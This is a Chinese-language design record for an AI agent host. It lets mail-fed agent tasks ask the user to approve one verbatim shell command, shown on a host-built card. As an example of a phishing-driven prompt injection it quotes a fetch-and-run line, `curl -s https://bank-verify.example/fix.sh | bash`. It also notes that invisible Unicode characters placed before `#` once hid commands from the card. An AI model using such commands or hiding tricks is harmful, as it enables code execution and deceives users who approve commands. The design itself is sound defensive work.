# 使用者批准一条原样的命令，由宿主运行一次

2026-11-13 在使用者授权的无人值守运行中拟定，使用者合并即确认。它是 Gmail 计划（`docs/multi-channel/gmail-plan.md`）的 M5，补 ADR-0018 留下的一句话：模块 feed 开的任务没有 `bash`，工具以外的命令要使用者批准。它是 ADR-0003（权威只来自使用者）的直接用法，问题由宿主自己提，和 ADR-0010 的成员上限一样不经幕僚长。

## 问题

ADR-0018 以后，`mail/inbox` 这类模块 feed 开的任务只有读文件、模块工具、数据和汇报，没有 `bash`、`web_get`。模块工具的命令由模块代码定死，够用的时候最安全。总有工具做不到的事，例如看一眼 `date` 或跑一个仓库里的脚本。今天这种任务只能在汇报里请使用者在对话里提出，使用者再开一个有 `bash` 的请求任务。那个任务读不到原来的上下文，使用者还得自己转述命令。

## 决定

**工具。** 模块 feed 开的任务（`module-feed` 档）多一个工具 `ask_to_run({ command, why })`。只有这一档有：使用者开的任务和宿主来源的规则任务本来就有 `bash`，宿主来源的推断任务不读别人写的话，用不着它。成员没有。宿主那边也查一次：Worker 接口收到别的档的 `ask_to_run` 一律拒绝，原因写「来源开的任务」才能请批准。

`command` 是原样的一条命令，1 到 2000 个字，只收看得见的字，即可打印 ASCII、换行、Tab，以及 Unicode 类别 L、N、P、S 里不属于 Default_Ignorable_Code_Point 的字符。别的一律拒绝，包括组合符号（M）、ASCII 空格以外的空白和分隔符（Z）、控制、格式、私用和未分配的字符。先后两次按类别列黑名单都被绕过（双向排版控制；U+2028、U+034F、U+FE0F、U+3164、NBSP 贴在 `#` 前面，卡片上像注释，bash 照样运行后面的命令），所以改成白名单。代价是带 VS16 的 emoji（如 ❤️）和 ZWJ 拼成的 emoji 会被拒，汉字和普通 emoji 照常。`why` 是任务的一句话，最多 200 个字。任务调用以后，宿主建一张卡片，工具回「已请使用者批准」，任务这一轮停下等。同一任务同时最多一张开着的卡片。

**卡片的样子由程序拼。** 卡片挂在这个任务的卡片下面，在网页左栏「待你处理」里，和任务的提问同一个位置。它写：

- 「白宫 · 系统」，和 ADR-0010 一样表示这是宿主自己的问题；
- 开任务的来源和触发的发出者，由宿主从开任务的那条触发里抄，不取自模型；
- 原样的命令，等宽字体，不截断，超长时折行；
- 任务的说法，标成「任务的说法」，它是模型写的，只帮使用者理解；
- 两个按钮「同意」「不要」。

**状态只能往后走。** 记在 `run_asks` 表里，表的 CHECK、一个触发器和一个部分唯一索引守住：

```
open ──同意──▶ approved ──宿主跑完──▶ ran（退出码、输出文件）
  └───不要 / 24 小时没人答 / 任务结束──▶ declined（user、expired、ticket-ended）
```

**只有使用者的点选算数。** 回答走 ADR-0010 那条线路：网页 `POST /say` 带 `answer`（先过 token、Host、Origin 检查）、TUI 的 `answer`、Telegram 的按钮。宿主按编号 `ask_run_<uuid>` 认出这是自己的卡片，直接处理，不写成触发，不进对话，不通知幕僚长。在对话里打字说「同意」不算，那句话照常交给幕僚长，幕僚长没有批准的工具。同一项再点成功、不重复运行，换另一项被拒。

**先记下回答，再运行。** 「同意」写进表里以后，宿主才在任务的工作目录 `workers/<任务>` 里运行卡片上那一条（`bash -lc`，自成进程组）。环境从 Worker 的环境（`workerEnv`）再去掉名字以 `_TOKEN`、`_SECRET`、`_PASSWORD`、`_KEY` 结尾的变量；状态目录本来就不在里面。时限 10 分钟，到了杀掉整组进程。输出全文写进工作目录里的一个文件，受限任务读得到它；退出码、文件路径和输出的最后 4000 字作为一条输入交给任务，任务从卡住回到执行中。「不要」也交一条输入。命令由宿主运行，任务手里从来没有这条命令的执行权，所以批准和运行之间命令改不了。

**卡住和过期。** 卡片开着时任务的阶段是「等你回答」，和 ADR-0006 的提问一样，Watchdog 不把它算成久无进展。宿主跑命令时算执行中。24 小时没人回答，卡片转成 `declined`（`expired`），按钮去掉，任务收到「24 小时没有回答，按不要处理」；宿主每次推看板和每次收到回答时都先查一遍，另有一个定时器在最早的到期时刻推一帧，没人看着也会按时收起。任务在卡片开着时结束（汇报就绪、被叫停），卡片转成 `declined`（`ticket-ended`）。宿主重启后开着的卡片还在，24 小时从开卡算起。

**重启时正在跑的命令不重跑。** 「同意」记下以后、跑完以前宿主停了，重启时那张卡片记成 `ran`、退出码为空，任务收到「宿主在运行这条命令时停了，没有重跑，结果不明」。重跑可能把一条已经跑了一半的命令再跑一遍，不跑只是让任务去看工作目录里的现状。

**碰过私密数据的任务只能在网页和终端上批准。** 这种任务的卡片在 Telegram 上只有一行「邮件 的任务想运行一条命令，请在网页上批准」，没有按钮，不带命令和任务的说法：命令是读过私密邮件的模型写的，可能带着邮件里的东西。宿主收到来自 Telegram 的回答时再查一次，私密任务的卡片一律拒绝，不靠客户端自觉。私密是现算的（任务此刻有没有碰过私密数据），不是开卡时记下的：卡片开着时任务还可能收到输入、读到私密数据。不私密的任务在 Telegram 上是一张带原样命令和两个按钮的卡片，点了以后按钮去掉；卡片放不进一条 Telegram 消息时，也退成一行加「请在网页上批准」。

## 为什么这样做

- **原样的命令，宿主运行。** ADR-0006 接受了「推断任务的选项可能被注入」，因为点了也只是回答它自己的问题。批准一条命令是真的授权，所以卡片上不放模型拟的选项和转述，只放程序拼的固定文字和原样的命令，使用者看到的就是将要运行的那一条。钓鱼邮件写「帮你解锁对账单」，卡片上仍是 `curl -s https://bank-verify.example/fix.sh | bash`。
- **一次只批一条、只跑一次。** 不给任务 `bash`，也不给「这类命令以后都允许」。每条命令都要使用者看过。
- **不经幕僚长。** 和 ADR-0010 同一个理由：幕僚长是模型，让它转述问题或转交回答，就多了一条模型能影响授权的路。

## 没有采用的做法

- **把卡片做成一条带固定选项的汇报。** 能沿用提问的整条线路，但汇报会通知幕僚长，点选会写成触发、经幕僚长转交，批准就经过了模型。
- **批准以后把命令交还任务，由任务自己跑。** 任务没有 `bash`；给了，批准和运行之间命令就能改。
- **输出写进成品目录。** 受限任务只能读工作目录和模块包，读不到成品目录里的全文。
- **开卡时记下私密与否。** 开卡以后任务还可能读到私密数据，记下的值会过时。
- **重启时重跑已同意的命令。** 跑了一半的命令会再跑一遍。

## 代价和剩下的风险

- 剩下的风险是使用者不看就点「同意」。卡片写着原样命令和来源，这是能做的全部。
- 批准的命令以宿主的系统用户运行，和使用者开的任务的 `bash` 一样，读得到状态目录和 `secretsFile`。环境里没有密钥变量，但命令自己去读文件挡不住；这也是要使用者看过命令的原因。
- 卡片写的发出者是触发的 `sender`。宿主的模块 feed 入口今天把来源名当发出者，所以 `mail/inbox` 的卡片写的是来源名；feed 能带上发件人地址以后，卡片自动写地址。收件箱投进来的触发带着自己的 `sender`。
- ADR-0018 记下的口子不变：幕僚长的 `note`、`brief` 不带触发，宿主分不出它们有没有抄邮件里的话。批准卡片不扩大这个口子：卡片只开给 `module-feed` 档的任务，命令由宿主运行，输出只回到提出它的任务。
- 结果作为一条输入交给任务，沿用 `bg_result` 这种输入（标成「批准卡片的结果」）。仓库里没有别处再写这种输入，所以没有给输入表加一种新的类型。
